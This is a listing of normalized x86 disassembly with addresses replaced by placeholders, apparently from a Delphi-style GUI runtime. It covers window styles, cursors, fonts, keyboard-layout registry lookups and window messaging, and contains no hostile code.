pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_455368
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_4552f8
pop ecx
mov eax [ esi + 0x34 ]
call sub_44a848
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_44a858
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_4553ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d578
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403454
sub_455410
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403454
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_455440
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455410
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455440
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4554bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_455410
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_455410
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_455440
pop ecx
test al al
je r-xdata
sub_455510
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403454
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_455540
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455510
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_455540
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4555bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_455510
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_455510
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_455540
pop ecx
test al al
je r-xdata
sub_455610
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4137ac
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_444e90
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_455664
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_455610
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403454
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4556e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_4198f0
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45571c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_438f24
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_439bf4
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455764
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_43f52c
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_43f228
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_43f228
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_43f228
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_43f228
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_43f228
push eax
call RedrawWindow
sub_4558b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_450668
mov dl 0x5
mov eax ebx
call sub_4523dc
mov dl 0x1
mov eax ebx
call sub_43de04
mov dl 0x3
mov eax ebx
call sub_4526d8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_455920
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4559f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43dcc4
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43db30
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_437f54
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4389b4
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404080
mov eax [ ebp - 0xc ]
call sub_404250
push eax
mov eax [ ebp - 0xc ]
call sub_404450
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4389c4
mov eax [ ebp - 0xc ]
call sub_404250
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4559fe
lea eax [ ebp - 0xc ]
call sub_403f90
retn
mov dl 0x1
mov eax esi
call sub_451a5c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_438a70
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4045dc
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_455a24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_43bf58
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_451180
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_43bf1c
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403454
inc ebp
dec edi
jne r-xdata
sub_455a70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_43dcc4
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_455a9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e4cc
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_455ac4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_453e2c
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43f228
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_43dcc4
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43f228
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43f228
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43dcd8
or ecx 0xffffffff
mov dl 0x1
call sub_4390e8
pop esi
pop ebx
retn
sub_455b5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43e93c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_439bf4
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_4383e0
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403454
sub_455bb4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_455c7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4389b4
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404080
mov eax [ ebp - 0x4 ]
call sub_404250
push eax
mov eax [ ebp - 0x4 ]
call sub_404450
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_4389c4
mov eax [ ebp - 0x4 ]
call sub_404250
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_438a70
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455c81
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_451a5c
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045dc
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_455ca0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43e6bc
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43dcc4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43dcd8
mov dl [ ebx + 0x57 ]
call sub_438960
inc edi
dec esi
jne r-xdata
sub_455d44
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_455d74
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_455da4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41914c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_456148
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_456154
mov eax ebx
call sub_456160
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_45257c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c010
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c010
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c010
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_456580
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45645c
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45645c
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45645c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_455efc
push ebx
push esi
push edi
push ebp
call sub_4035cc
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403258
mov eax [ ebp + 0x88 ]
call sub_403258
mov eax [ ebp + 0x84 ]
call sub_403258
mov eax [ ebp + 0x54 ]
call sub_403258
mov eax [ ebp + 0x50 ]
call sub_403258
mov eax [ ebp + 0x4c ]
call sub_403258
mov eax [ ebp + 0x30 ]
call sub_403258
mov eax [ ebp + 0x34 ]
call sub_403258
mov eax [ ebp + 0x7c ]
call sub_403258
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403258
mov eax ebp
call sub_4561bc
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419198
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035b4
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4137ac
call sub_403258
inc edi
dec esi
jne r-xdata
sub_456074
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4560c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413650
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413650
mov eax [ rw-data ]
call sub_458e4c
sub_4560f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4138f0
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4138f0
mov eax [ rw-data ]
call sub_458e4c
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_440800
sub_456160
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_456218
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_4561bc
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026dc
mov ebx esi
test ebx ebx
jne r-xdata
sub_456218
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_456240
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4563eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4563f2
lea eax [ ebp - 0x260 ]
call sub_403f90
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403f90
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41533c
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408984
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_443f64
test al al
je r-xdata
xor eax eax
push ebp
push sub_4563a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404200
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404200
sub_45645c
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_458cbc
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_458a70
mov dl 0x1
mov eax [ rw-data ]
call sub_458a70
sub_4564c8
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_4564f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_4564c8
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_4068b4
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406830
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_456580
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4566c5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_458a70
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c3a0
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c3a0
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41c484
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c3a0
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41c3a0
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c3a0
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_458a70
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41c1e4
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41c1e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4566cc
cmp [ rw-data ] 0x0
je r-xdata
sub_456704
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
